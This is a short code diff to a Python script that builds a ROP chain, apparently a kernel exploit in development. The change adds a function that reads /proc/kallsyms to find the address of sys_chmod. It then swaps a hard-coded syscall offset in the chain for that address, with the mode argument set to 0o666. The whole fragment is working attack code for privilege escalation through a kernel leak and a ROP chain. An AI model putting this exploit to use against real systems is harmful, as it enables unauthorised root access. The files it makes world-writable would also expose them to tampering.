@@ -65,6 +65,10 @@ class Adjuster(object):
         return self.offset + addr
 adjuster = Adjuster(0x00)
 
+def chmod_addr():
+    with open('/proc/kallsyms', 'rb') as i:
+        return int([l.split()[0] for l in i.read().decode('utf-8').split('\n')
+                if 'sys_chmod' in l][0], 16)
 
 def leaked(start_leaker, search_for):
     # Get the address from the leak
@@ -147,7 +151,9 @@ def build(leak, gadget_file, sled_length):
     # set rsi
     rop.raw(0o666)
     # syscall; NULL
-    rop.raw(adjuster(leak + 0x012c384))
+    # rop.raw(adjuster(leak + 0x012c384))
+    # sys_chmod
+    rop.raw(adjuster(chmod_addr()))
 
     # Display our completed ROP chain
     print(rop.dump())
